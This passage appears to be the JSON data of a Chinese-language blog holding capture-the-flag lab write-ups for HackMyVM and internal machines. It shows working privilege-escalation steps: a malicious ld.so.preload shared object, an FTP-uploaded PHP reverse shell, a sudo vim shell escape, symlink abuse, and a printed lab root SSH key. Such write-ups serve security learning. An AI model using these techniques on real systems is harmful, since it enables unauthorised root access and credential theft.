\nSorry, user welcome may not run sudo on listen.\nwelcome@listen:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/mount\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/umount\n/usr/bin/newgrp\n/usr/bin/touch\n/usr/bin/su\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n```\n\n/usr/bin/touch\u662f\u591a\u7684\uff0c\u627e\u4e00\u4e0b\u600e\u4e48\u63d0\u6743\u5427\uff0c\u627e\u534a\u5929\u4e5f\u627e\u4e0d\u5230\uff0c\u6211\u5c31\u7b49\u7fa4u\u7684wp\u4e86\n\n![image-20250331191023675](https://7r1umphk.github.io/image/20250331191023738.png)\n\n\u8fc7\u4fee\u6539 /etc/ld.so.preload \u6587\u4ef6\u5b9e\u73b0\u83b7\u5f97 root \u6743\u9650\uff0c\u6211\u4eec\u8ddf\u7740\u5b9e\u73b0\u4e00\u4e0b\n\n\u67e5\u770b\u4e00\u4e0btouch\u547d\u4ee4\u7684so\u7684\u8ddf\u8e2a\u6d41\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ strace touch 2>&1 | grep -Pi 'open|access|no such file'\nstrace: Symbol `_UPT_accessors' has different size in shared object, consider re-linking\naccess('/etc/ld.so.preload', R_OK)      = -1 ENOENT (\u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55)\nopenat(AT_FDCWD, '/etc/ld.so.cache', O_RDONLY|O_CLOEXEC) = 3\nopenat(AT_FDCWD, '/lib/x86_64-linux-gnu/libc.so.6', O_RDONLY|O_CLOEXEC) = 3\nopenat(AT_FDCWD, '/usr/lib/locale/locale-archive', O_RDONLY|O_CLOEXEC) = 3\nopenat(AT_FDCWD, '/usr/share/locale/locale.alias', O_RDONLY|O_CLOEXEC) = 3\nopenat(AT_FDCWD, '/usr/share/locale/zh_CN.UTF-8/LC_MESSAGES/coreutils.mo', O_RDONLY) = -1 ENOENT (\u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55)\nopenat(AT_FDCWD, '/usr/share/locale/zh_CN.utf8/LC_MESSAGES/coreutils.mo', O_RDONLY) = -1 ENOENT (\u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55)\nopenat(AT_FDCWD, '/usr/share/locale/zh_CN/LC_MESSAGES/coreutils.mo', O_RDONLY) = 3\nopenat(AT_FDCWD, '/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache', O_RDONLY|O_CLOEXEC) = 3\n```\n\n/etc/ld.so.preload \u662f\u7f3a\u5931\u7684\uff0c\u6211\u4eec\u53bb\u9776\u673a\u770b\u770b\n\n```\nwelcome@listen:~$ ls -la /etc/ld.so.preload                                                                                          \nls: cannot access '/etc/ld.so.preload': No such file or directory   \n```\n\n\u90a3\u7b80\u5355\u4e86\uff0c\u6211\u4eec\u53bb\u521b\u5efa\u4e00\u4e2a\u6076\u610fso\u5c31\u597d\u4e86\n\n\ud83d\udd17https://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/write-to-root.html\n\n\u5728kali\u521b\u5efa\u4e00\u4e2a\u6076\u610fso\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat exp.c \n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>  // \u5305\u542b unlink(), setuid(), setgid() \u7b49\u51fd\u6570\n\nvoid _init() {\n    // \u5220\u9664 /etc/ld.so.preload \u6587\u4ef6\n    unlink('/etc/ld.so.preload');\n\n    // \u63d0\u5347\u6743\u9650\uff0c\u8bbe\u7f6e\u4e3a root \u7528\u6237\u548c\u7ec4\n    setgid(0);    // \u8bbe\u7f6e\u4e3a root \u7ec4\n    setuid(0);    // \u8bbe\u7f6e\u4e3a root \u7528\u6237\n\n    // \u6267\u884c shell\uff08\u5982\u9700\u8981\uff09\n    system('/bin/bash');\n}\n   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles\n                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n192.168.205.141 - - [03/Feb/2025 17:31:20] 'GET /exp.so HTTP/1.1' 200 -\nwelcome@listen:/tmp$ wget 192.168.205.128/exp.so\n--2025-02-03 04:31:04--  http://192.168.205.128/exp.so\nConnecting to 192.168.205.128:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 14152 (14K) [application/octet-stream]\nSaving to: \u2018exp.so\u2019\n\nexp.so                                                       0%[                                                                       exp.so                                                     100%[========================================================================================================================================>]  13.82K  --.-KB/s    in 0s    \n\n2025-02-03 04:31:04 (91.0 MB/s) - \u2018exp.so\u2019 saved [14152/14152]\n\nwelcome@listen:/tmp$ chmod +x exp.so \nwelcome@listen:/tmp$ umask 000\nwelcome@listen:/tmp$ touch /etc/ld.so.preload\nwelcome@listen:/tmp$ ls -al /etc/ld.so.preload\n-rw-rw-rw- 1 root root 0 Feb  3 04:31 /etc/ld.so.preload\nwelcome@listen:/tmp$ echo '/tmp/exp.so' > /etc/ld.so.preload\nwelcome@listen:/tmp$ touch test\nroot@listen:/tmp# id\nuid=0(root) gid=0(root) groups=0(root),1001(welcome)\n```\n\n<!-- ##{'timestamp':1738580133}## -->sentence", "top": 0, "createdAt": 1738580133, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-03", "dateLabelColor": "#0969da"}, "P4": {"htmlDir": "docs/post/hmv_friendly.html", "labels": ["HackMyVM"], "postTitle": "hmv_friendly", "postUrl": "post/hmv_friendly.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/4", "commentNum": 0, "wordCount": 4831, "description": "# 0.\u7b80\u4ecb\n\n\u9776\u673a\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Friendly\n \u96be\u5ea6\uff1a\u7eff\u8272\n \u76ee\u6807 IP\uff1a192.168.205.129\n \u672c\u673a IP\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\nnmap\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST\nNmap scan report for 192.168.205.129\nHost is up (0.00059s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n21/tcp open  ftp\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 1.10 seconds\n```\n\n# 2.\u8e29\u70b9\n\n\u5148\u8fdb\u884cftp\u533f\u540d\u767b\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.129\nConnected to 192.168.205.129.\n220 ProFTPD Server (friendly) [::ffff:192.168.205.129]\nName (192.168.205.129:kali): anonymous\n331 Anonymous login ok, send your complete email address as your password\nPassword: \n230 Anonymous access granted, restrictions apply\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n229 Entering Extended Passive Mode (|||17885|)\n150 Opening ASCII mode data connection for file list\ndrwxrwxrwx   2 root     root         4096 Mar 11  2023 .\ndrwxrwxrwx   2 root     root         4096 Mar 11  2023 ..\n-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html\n```\n\n\u548c\u6211\u4eec\u53d1\u73b0\u7684\u7f51\u9875\u76ee\u5f55\u67b6\u6784\u4e00\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4e0a\u4f20\u4e00\u4e2a\u53cd\u5f39shell\u4e0a\u53bb\u8bbf\u95ee\n\n```\nftp> put php.php \nlocal: php.php remote: php.php\n229 Entering Extended Passive Mode (|||22559|)\n150 Opening BINARY mode data connection for php.php\n100% |*****************************************************************************************|  2596      255.89 KiB/s    00:00 ETA\n226 Transfer complete\n2596 bytes sent in 00:00 (241.58 KiB/s)\nftp> ls\n229 Entering Extended Passive Mode (|||7798|)\n150 Opening ASCII mode data connection for file list\n-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html\n-rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php\n226 Transfer complete\n```\n\n\u8bbf\u95ee\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 35158\nLinux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux\n 23:33:07 up 7 min,  0 users,  load average: 1.36, 6.63, 3.71\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (439): Inappropriate ioctl for device\nbash: no job control in this shell\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6\u53cd\u5411 shell \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```\nwww-data@friendly:/$ ls -la\ntotal 68\ndrwxr-xr-x  18 root root  4096 Mar 11  2023 .\ndrwxr-xr-x  18 root root  4096 Mar 11  2023 ..\nlrwxrwxrwx   1 root root     7 Feb 21  2023 bin -> usr/bin\ndrwxr-xr-x   3 root root  4096 Feb 21  2023 boot\ndrwxr-xr-x  17 root root  3140 Feb  2 23:26 dev\ndrwxr-xr-x  69 root root  4096 Feb  2 23:26 etc\ndrwxr-xr-x   3 root root  4096 Feb 21  2023 home\nlrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img -> boot/initrd.img-5.10.0-21-amd64\nlrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64\nlrwxrwxrwx   1 root root     7 Feb 21  2023 lib -> usr/lib\nlrwxrwxrwx   1 root root     9 Feb 21  2023 lib32 -> usr/lib32\nlrwxrwxrwx   1 root root     9 Feb 21  2023 lib64 -> usr/lib64\nlrwxrwxrwx   1 root root    10 Feb 21  2023 libx32 -> usr/libx32\ndrwx------   2 root root 16384 Feb 21  2023 lost+found\ndrwxr-xr-x   3 root root  4096 Feb 21  2023 media\ndrwxr-xr-x   2 root root  4096 Feb 21  2023 mnt\ndrwxr-xr-x   2 root root  4096 Feb 21  2023 opt\ndr-xr-xr-x 145 root root     0 Feb  2 23:26 proc\ndrwx------   3 root root  4096 Mar 11  2023 root\ndrwxr-xr-x  17 root root   540 Feb  2 23:26 run\nlrwxrwxrwx   1 root root     8 Feb 21  2023 sbin -> usr/sbin\ndrwxr-xr-x   2 root root  4096 Mar 11  2023 srv\ndr-xr-xr-x  13 root root     0 Feb  2 23:26 sys\ndrwxrwxrwt   2 root root  4096 Feb  2 23:26 tmp\ndrwxr-xr-x  14 root root  4096 Feb 21  2023 usr\ndrwxr-xr-x  12 root root  4096 Feb 21  2023 var\nlrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz -> boot/vmlinuz-5.10.0-21-amd64\nlrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64\nwww-data@friendly:/$ sudo -l\nMatching Defaults entries for www-data on friendly:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on friendly:\n    (ALL : ALL) NOPASSWD: /usr/bin/vim\n```\n\n![image-20250331191435274](https://7r1umphk.github.io/image/20250331191435317.png)\n\n\ud83d\udd17https://gtfobins.github.io/gtfobins/vim/#sudo\n\n```\nwww-data@friendly:/$ sudo vim -c ':!/bin/sh'\n\n# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n<!-- ##{'timestamp':1738580133}## -->sentence", "top": 0, "createdAt": 1738580133, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-03", "dateLabelColor": "#0969da"}, "P22": {"htmlDir": "docs/post/panghu.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "panghu", "postUrl": "post/panghu.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/22", "commentNum": 0, "wordCount": 8754, "description": "\u88d9u\u7684\u63d0\u6743\u9898\n\n![image-20250331190451295](https://7r1umphk.github.io/image/20250331190451337.png)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo arp-scan -l     \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.\n192.168.205.147 08:00:27:86:a6:d2       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fb:6e:be       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh ssh@192.168.205.147\nThe authenticity of host '192.168.205.147 (192.168.205.147)' can't be established.\nED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:3: [hashed name]\n    ~/.ssh/known_hosts:8: [hashed name]\n    ~/.ssh/known_hosts:9: [hashed name]\n    ~/.ssh/known_hosts:10: [hashed name]\n    ~/.ssh/known_hosts:11: [hashed name]\n    ~/.ssh/known_hosts:12: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.147' (ED25519) to the list of known hosts.\nssh@192.168.205.147's password: \nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee <https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~$ sudo -l\n[sudo] password for ssh: \nMatching Defaults entries for ssh on jan:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults for ssh:\n    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'\n\nUser ssh may run the following commands on jan:\n    (root) PASSWD: /opt/lzh.sh\njan:~$ cat /opt/lzh.sh \n#!/bin/sh\n\ncd /home/ssh\ncat backup/hi\njan:~$ cd /home/ssh/backup/\njan:~/backup$ ls -al\ntotal 12\ndrwxr-xr-x    2 root     root          4096 Feb  3 23:28 .\ndrwxr-sr-x    3 ssh      ssh           4096 Feb  3 23:27 ..\n-rw-------    1 root     root             9 Feb  3 23:28 hi\n```\n\n\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u662f\u6709\u6743\u9650\u6539\u76ee\u5f55\u7684\uff0c\u4f46\u662f\u4e0d\u80fd\u5220\u9664\n\n```\njan:~/backup$ cd ..\njan:~$ ls -la\ntotal 12\ndrwxr-sr-x    3 ssh      ssh           4096 Feb  3 23:27 .\ndrwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..\nlrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -> /dev/null\ndrwxr-xr-x    2 root     root          4096 Feb  3 23:28 backup\njan:~$ mv backup/ backup1\njan:~$ mkdir backup\njan:~$ cd backup\njan:~$ cd backup\njan:~/backup$ ln -s /root/root.txt hi\njan:~/backup$ sudo /opt/lzh.sh \nflag{LingMj}\n```\n\n\u7136\u540e\u6211\u5c31\u53bb\u8bfb\u53d6\u5bc6\u94a5\u548cshadow\u4e86\uff0c\u6211\u4ee5\u4e3a\u6ca1\u6709id_rsa\u5c31\u662f\u6ca1\u6709\u5bc6\u94a5\uff0c\u6211\u5c31\u6ca1\u770b\uff0c\u54ea\u77e5\u9053\n\n![image-20250331190502904](https://7r1umphk.github.io/image/20250331190503009.png)\n\nhaha\u6211\u771f\u50bb\n\n```\njan:~/backup$ rm hi \njan:~/backup$ sudo /opt/lzh.sh \n#       $OpenBSD: sshd_config,v 1.104 2021/07/02 05:11:21 dtucker Exp $\n\n# This is the sshd server system-wide configuration file.  See\n# sshd_config(5) for more information.\n\n# This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\n# The strategy used for options in the default sshd_config shipped with\n# OpenSSH is to specify options with their default value where\n# possible, but leave them commented.  Uncommented options override the\n# default value.\n\n# Include configuration snippets before processing this file to allow the\n# snippets to override directives set in this file.\nInclude /etc/ssh/sshd_config.d/*.conf\n\n#Port 22\n#AddressFamily any\n#ListenAddress 0.0.0.0\n#ListenAddress ::\n\n#HostKey /etc/ssh/ssh_host_rsa_key\n#HostKey /etc/ssh/ssh_host_ecdsa_key\n#HostKey /etc/ssh/ssh_host_ed25519_key\n\n# Ciphers and keying\n#RekeyLimit default none\n\n# Logging\n#SyslogFacility AUTH\n#LogLevel INFO\n\n# Authentication:\n\n#LoginGraceTime 2m\nPermitRootLogin yes\nstrictModes yes\n#MaxAuthTries 6\n#MaxSessions 10\n\n#PubkeyAuthentication yes\n\n# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2\n# but this is overridden so installations will only check .ssh/authorized_keys\nAuthorizedKeysFile      ~/.ssh/authorized_keys\n\n#AuthorizedPrincipalsFile none\n\n#AuthorizedKeysCommand none\n#AuthorizedKeysCommandUser nobody\n\n# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts\n#HostbasedAuthentication no\n# Change to yes if you don't trust ~/.ssh/known_hosts for\n# HostbasedAuthentication\n#IgnoreUserKnownHosts no\n# Don't read the user's ~/.rhosts and ~/.shosts files\n#IgnoreRhosts yes\n\n# To disable tunneled clear text passwords, change to no here!\n#PasswordAuthentication yes\n#PermitEmptyPasswords no\n\n# Change to no to disable s/key passwords\n#KbdInteractiveAuthentication yes\n\n# Kerberos options\n#KerberosAuthentication no\n#KerberosOrLocalPasswd yes\n#KerberosTicketCleanup yes\n#KerberosGetAFSToken no\n\n# GSSAPI options\n#GSSAPIAuthentication no\n#GSSAPICleanupCredentials yes\n\n# Set this to 'yes' to enable PAM authentication, account processing,\n# and session processing. If this is enabled, PAM authentication will\n# be allowed through the KbdInteractiveAuthentication and\n# PasswordAuthentication.  Depending on your PAM configuration,\n# PAM authentication via KbdInteractiveAuthentication may bypass\n# the setting of 'PermitRootLogin prohibit-password'.\n# If you just want the PAM account and session checks to run without\n# PAM authentication, then enable this but set PasswordAuthentication\n# and KbdInteractiveAuthentication to 'no'.\n#UsePAM no\n\n#AllowAgentForwarding yes\n# Feel free to re-enable these if your use case requires them.\nAllowTcpForwarding no\nGatewayPorts no\nX11Forwarding no\n#X11DisplayOffset 10\n#X11UseLocalhost yes\n#PermitTTY yes\n#PrintMotd yes\n#PrintLastLog yes\n#TCPKeepAlive yes\n#PermitUserEnvironment no\n#Compression delayed\n#ClientAliveInterval 0\n#ClientAliveCountMax 3\n#UseDNS no\n#PidFile /run/sshd.pid\n#MaxStartups 10:30:100\n#PermitTunnel no\n#ChrootDirectory none\n#VersionAddendum none\n\n# no default banner path\n#Banner none\n\n# override default of no subsystems\nSubsystem       sftp    internal-sftp\n\n# Example of overriding settings on a per-user basis\n#Match User anoncvs\n#       X11Forwarding no\n#       AllowTcpForwarding no\n#       PermitTTY no\n#       ForceCommand cvs server\njan:~/backup$ rm hi \njan:~/backup$ ln -s /root/.ssh/id_ed25519 hi\njan:~/backup$ sudo -l\n[sudo] password for ssh: \nMatching Defaults entries for ssh on jan:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults for ssh:\n    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'\n\nUser ssh may run the following commands on jan:\n    (root) PASSWD: /opt/lzh.sh\njan:~/backup$ sudo /opt/lzh.sh\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjgAAAJB2iiMQdooj\nEAAAAAtzc2gtZWQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjg\nAAAEAUhlfWSQ4VtYPAVaPWXTsnbEFiir93k1A3Icbge7uj5oCCTv9WGP1Puf9NX55DiJwe\nYnL8z4mnTt6s36lxTDOOAAAACHJvb3RAamFuAQIDBAU=\n-----END OPENSSH PRIVATE KEY-----\njan:~/backup$ nano id\njan:~/backup$ cat id \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjgAAAJB2iiMQdooj\nEAAAAAtzc2gtZWQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjg\nAAAEAUhlfWSQ4VtYPAVaPWXTsnbEFiir93k1A3Icbge7uj5oCCTv9WGP1Puf9NX55DiJwe\nYnL8z4mnTt6s36lxTDOOAAAACHJvb3RAamFuAQIDBAU=\n-----END OPENSSH PRIVATE KEY-----\njan:~/backup$ chmod 600 id \njan:~/backup$ ssh -i id root@127.0.0.1\nThe authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.\nED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.\nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee <https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~# id\nuid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n```\n\n<!-- ##{'timestamp':1738666533}## -->sentence", "top": 0, "createdAt": 1738666533, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-04", "dateLabelColor": "#0969da"}, "P6": {"htmlDir": "docs/post/hmv_Medusa.html", "labels": ["HackMyVM"], "postTitle": "hmv_Medusa", "postUrl": "post/hmv_Medusa.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/6", "commentNum": 0, "wordCount": 52485, "description": "# 0.\u7b80\u4ecb\n\n\u9776\u673a\uff1ahttps://hackmyvm.eu/machines/?v=Medusa\n \u96be\u5ea6\uff1a\u7eff\u8272\n \u76ee\u6807 IP\uff1a192.168.205.145\n \u672c\u673a IP\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\nnmap\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n --min-rate 10000 192.168.205.145\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:42 CST\nStats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan\nNSE Timing: About 0.00% done\nNmap scan report for 192.168.205.145\nHost is up (0.00026s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)\n|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)\n|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)\n80/tcp open  http    Apache httpd 2.4.54 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.54 (Debian)\nMAC Address: 08:00:27:5D:E9:45 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.26 ms 192.168.205.145\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.08 seconds\n                                                           \n```\n\n# 2.\u8e29\u70b9\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.145\nConnected to 192.168.205.145.\n220 (vsFTPd 3.0.3)\nName (192.168.205.145:kali): anonymous\n331 Please specify the password.\nPassword: \n530 Login incorrect.\nftp: Login failed\nftp> \nftp> exit\n221 Goodbye.\n```\n\n\u4e0d\u8bb8\u767b\uff0c\u90a3\u53bb\u770b80\u3002\u662f\u4e2a\u9ed8\u8ba4\u9875\n\n![image-20250331190711601](https://7r1umphk.github.io/image/20250331190711760.png)\n\n\u6709\u5173\u7c7b\u4f3c\u662f\u7528\u6237\u540d\u7684\u4e1c\u897fKraken\uff0c\u4e0d\u7ba1\u5148\uff0c\u6211\u4eec\u76ee\u5f55\u7206\u7834\u4e00\u4e0b\n\nps:\u56e0\u4e3a\u5b83\u6709\u4e00\u4e2amanual\u8def\u5f84\u4f1a\u7206\u51fa\u5f88\u591a\u6ca1\u6709\u5229\u7528\u4ef7\u503c\u7684\u4e8c\u7ea7\u76ee\u5f55\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u6b21\u7528gobuster\uff0c\u7136\u540e\u518d\u8fc7\u6ee4\u4e00\u4e9b403\u7684\u6ca1\u7528\u72b6\u6001\u7801\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.145 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.145\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 10674]\n/.                    (Status: 200) [Size: 10674]\n/manual               (Status: 301) [Size: 319] [--> http://192.168.205.145/manual/]\n/hades                (Status: 301) [Size: 318] [--> http://192.168.205.145/hades/]\nProgress: 598000 / 598005 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u63a5\u7740\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.145/hades/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.145/hades/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                